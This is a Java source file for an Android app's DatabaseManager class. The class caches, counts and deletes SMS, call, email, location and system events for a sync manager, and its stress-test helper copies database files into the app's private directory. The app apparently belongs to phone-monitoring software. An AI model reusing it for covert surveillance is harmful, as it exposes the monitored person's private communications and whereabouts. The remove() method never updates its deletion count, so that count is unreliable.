package com.vvt.android.syncmanager.control;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.channels.FileChannel;
import java.util.List;

import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import com.fx.dalvik.util.FxLog;

import com.fx.dalvik.event.Event;
import com.fx.dalvik.eventdb.EventDatabaseMetadata;
import com.vvt.android.syncmanager.Customization;

public class DatabaseManager {
	
	private static final String TAG = "DatabaseManager";
	private static final boolean DEBUG = true;
	private static final boolean LOCAL_LOGV = Customization.DEBUG ? DEBUG : false;
	@SuppressWarnings("unused")
	private static final boolean LOCAL_LOGD = Customization.DEBUG ? DEBUG : false;
	
	private static final String SEPARATOR = "###";
	private static final String COUNT_COLUMN = "count(*)";

	private Context mContext;
	
	private Object mLockEvents = new Object();
	
	public DatabaseManager(Context context) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "DatabaseManager # ENTER ...");
		}
		mContext = context;
		
		// Only use for Stress Test
		if (Customization.STRESS_TEST) {
			// To start all ContentProviders, before copy db files
			countTotalEvents();
			copyDBFilesForStressTest();
//			stressInsert(5000, 5000, 5000);
		}
	}
	
	/**
	 * Query for all events (of one specific type)
	 */
	public Cursor query(short deviceEventType, String[] projection, String selection) {
		Uri uri = null;
		
		if (deviceEventType == Event.TYPE_SMS) {
			uri = Uri.parse(EventDatabaseMetadata.Sms.URI);
		} 
		else if (deviceEventType == Event.TYPE_CALL) {
			uri = Uri.parse(EventDatabaseMetadata.Call.URI);
		}
		else if (deviceEventType == Event.TYPE_EMAIL) {
			uri = Uri.parse(EventDatabaseMetadata.Email.URI);
		}
		else if (deviceEventType == Event.TYPE_LOCATION) {
			uri = Uri.parse(EventDatabaseMetadata.Location.URI);
		}
		else if (deviceEventType == Event.TYPE_SYSTEM) {
			uri = Uri.parse(EventDatabaseMetadata.System.URI);
		}
		
		return mContext.getContentResolver().query(uri, projection, selection, null, null);
	}
	
	/**
	 * Inserts deviceEvent to the cache database.
	 */
	public Uri insert(Event event) { 
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "insert # ENTER ...");
		}
		ContentResolver contentResolver = mContext.getContentResolver();
		
		Uri uri = null;
		short deviceEventType = event.getType();
		switch (deviceEventType) {
			case Event.TYPE_SMS:
				uri = Uri.parse(EventDatabaseMetadata.Sms.URI);
				break;
			case Event.TYPE_CALL:
				uri = Uri.parse(EventDatabaseMetadata.Call.URI);
				break;
			case Event.TYPE_EMAIL:
				uri = Uri.parse(EventDatabaseMetadata.Email.URI);
				break;
			case Event.TYPE_LOCATION:
				uri = Uri.parse(EventDatabaseMetadata.Location.URI);
				break;
			case Event.TYPE_SYSTEM:
				uri = Uri.parse(EventDatabaseMetadata.System.URI);
				break;
		}

		synchronized (mLockEvents) {
			uri = contentResolver.insert(uri, event.getContentValues());
		}
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format("insert # [EVENT-INSERT]: %s, %s", 
					uri == null ? "FAILED" : "SUCCESS", event));
		}
		
		return uri;
	}
	
	/**
	 * Remove deviceEventList from cache database.
	 */
	public int remove(List<Event> deviceEventList) { 
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "remove # ENTER ...");
		}
		
		if (deviceEventList == null) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "remove # list is null, nothing to remove.");
			}
			return 0;
		}
		
		if (deviceEventList.size() == 0) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "remove # list has no members, nothing to remove.");
			}
			return 0;
		}		
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format("remove # Attempting to remove '%d' events", 
					deviceEventList.size()));
		}
		
		Uri uri = null;
		short deviceEventType = -1;
		int cumulativeDeleteCountInt = 0;
		
		for (Event event : deviceEventList) {
			deviceEventType = event.getType();
			
			switch (deviceEventType) {
				case Event.TYPE_CALL:
					uri = Uri.parse(EventDatabaseMetadata.Call.URI);
					break;
				case Event.TYPE_SMS:
					uri = Uri.parse(EventDatabaseMetadata.Sms.URI);
					break;
				case Event.TYPE_EMAIL:
					uri = Uri.parse(EventDatabaseMetadata.Email.URI);
					break;
				case Event.TYPE_LOCATION:
					uri = Uri.parse(EventDatabaseMetadata.Location.URI);
					break;
				case Event.TYPE_SYSTEM:
					uri = Uri.parse(EventDatabaseMetadata.System.URI);
					break;
			}
			uri = ContentUris.withAppendedId(uri, event.getRowId()) ;
			
			int deleteCountInt = 0;
			synchronized (mLockEvents) {
				deleteCountInt = mContext.getContentResolver().delete(uri, null, null);
			}
			
			if (LOCAL_LOGV) {
				FxLog.v(TAG, String.format(
						"remove # [EVENT-REMOVE]: %s, %s", 
						deleteCountInt == 0? "FAILED": "SUCCESS", event));
			}
		}
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format("remove # %d events deleted", 
					cumulativeDeleteCountInt));
		}
		
		return cumulativeDeleteCountInt;
	}
	
	public int countTotalEvents() { 
		int totalEvents = 0;
		int subTotal = -1;
		
		StringBuilder builder = new StringBuilder();
		
		for (short type : Event.TYPES_LIST) {
			subTotal = countEvents(type, null);
			totalEvents += subTotal;
			
			if (builder.length() > 0) {
				builder.append(", ");
			}
			
			builder.append(Event.getTypeAsString(type)).append(": ").append(subTotal);
		}
		
		builder.append(", Total: ").append(totalEvents);
		
		if (LOCAL_LOGV) { 
			FxLog.v(TAG, String.format("countTotalEvents # %s", builder.toString()));
		}
		
		return totalEvents;
	}
	
	public int countIncomingCall() {
		String selection = String.format("%s=%d", EventDatabaseMetadata.Call.DIRECTION, Event.DIRECTION_IN);
		return countEvents(Event.TYPE_CALL, selection);
	}
	
	public int countOutgoingCall() {
		String selection = String.format("%s=%d", EventDatabaseMetadata.Call.DIRECTION, Event.DIRECTION_OUT);
		return countEvents(Event.TYPE_CALL, selection);
	}
	
	public int countMissedCall() {
		String selection = String.format("%s=%d", EventDatabaseMetadata.Call.DIRECTION, Event.DIRECTION_MISSED);
		return countEvents(Event.TYPE_CALL, selection);
	}
	
	public int countIncomingSms() {
		String selection = String.format("%s=%d", EventDatabaseMetadata.Sms.DIRECTION, Event.DIRECTION_IN);
		return countEvents(Event.TYPE_SMS, selection);
	}
	
	public int countOutgoingSms() {
		String selection = String.format("%s=%d", EventDatabaseMetadata.Sms.DIRECTION, Event.DIRECTION_OUT);
		return countEvents(Event.TYPE_SMS, selection);
	}
	
	public int countIncomingEmail() {
		String selection = String.format("%s=%d", EventDatabaseMetadata.Email.DIRECTION, Event.DIRECTION_IN);
		return countEvents(Event.TYPE_EMAIL, selection);
	}
	
	public int countOutgoingEmail() {
		String selection = String.format("%s=%d", EventDatabaseMetadata.Email.DIRECTION, Event.DIRECTION_OUT);
		return countEvents(Event.TYPE_EMAIL, selection);
	}
	
	public int countLocation() {
		return countEvents(Event.TYPE_LOCATION, null);
	}
	
	public int countIncomingSystem() {
		String selection = String.format("%s=%d", EventDatabaseMetadata.System.DIRECTION, Event.DIRECTION_IN);
		return countEvents(Event.TYPE_SYSTEM, selection);
	}
	
	public int countOutgoingSystem() {
		String selection = String.format("%s=%d", EventDatabaseMetadata.System.DIRECTION, Event.DIRECTION_OUT);
		return countEvents(Event.TYPE_SYSTEM, selection);
	}

//------------------------------------------------------------------------------------------------------------------------
// PUBLIC STATIC API
//------------------------------------------------------------------------------------------------------------------------
	
	/**
	 * The result String will be something like "RowID=?###50" or "###50"
	 * @param limit value less than 1 will be ignore 
	 */
	public static String createLimitSelection(String selection, int limit) {
		if (selection == null) {
			selection = "";
		}
		if (limit > 0) {
			selection += SEPARATOR + limit;
		}
		return selection;
	}
	
	/**
	 * The result String will contains only SELECT clause e.g. "RowID=?"
	 */
	public static String getSelection(String selection) {
		if (selection == null) {
			return null;
		}
		else {
			String[] split = selection.split(SEPARATOR);
			return split[0].length() == 0 ? null : split[0];
		}
	}
	
	/**
	 * The result String will contains only LIMIT clause e.g. "50, 0"
	 */
	public static String getLimit(String selection) {
		if (selection == null) {
			return null;
		}
		else {
			String[] limit = selection.split(SEPARATOR);
			return limit.length > 1 ? selection.split(SEPARATOR)[1] : null;
		}
	}
	
//------------------------------------------------------------------------------------------------------------------------
// PRIVATE API
//------------------------------------------------------------------------------------------------------------------------

	/**
	 * Count device events in database
	 */
	private int countEvents(short eventType, String selection) {
		int count = 0;
		
		Cursor cursor = query(eventType, new String[] {COUNT_COLUMN}, selection);
		
		if (cursor != null && cursor.moveToFirst()) {
			count = cursor.getInt(0);
			cursor.close();
		}
		
		return count;
	}
	
	private void copyDBFilesForStressTest() {
		String targetPath = "/data/data/com.mobilefonex.mobilebackup/databases/";
		File sourceCall = new File("/sdcard/DeviceEventCall.db");
		File targetCall = new File(targetPath + "DeviceEventCall.db");
		
		File sourceSms = new File("/sdcard/DeviceEventSMS.db");
		File targetSms = new File(targetPath + "DeviceEventSMS.db");
		
		File sourceLoc = new File("/sdcard/DeviceEventLocation.db");
		File targetLoc = new File(targetPath + "DeviceEventLocation.db");
		
		try {
			if (sourceCall.exists()) {
				copyFile(sourceCall, targetCall);
			}
			if (sourceSms.exists()) {
				copyFile(sourceSms, targetSms);
			}
			if (sourceLoc.exists()) {
				copyFile(sourceLoc, targetLoc);
			}
		} catch (IOException e) {
			FxLog.v(TAG, "copyFile # " + e.getMessage());
		}
	}
	
	public void copyFile(File in, File out) throws IOException {
		FileChannel inChannel = new FileInputStream(in).getChannel();
		FileChannel outChannel = new FileOutputStream(out).getChannel();	    
		try {
			inChannel.transferTo(0, inChannel.size(), outChannel);
		}
		catch (IOException e) {
			throw e;
		}
		finally {
			if (inChannel != null) inChannel.close();
			if (outChannel != null) outChannel.close();
		}
	}
}
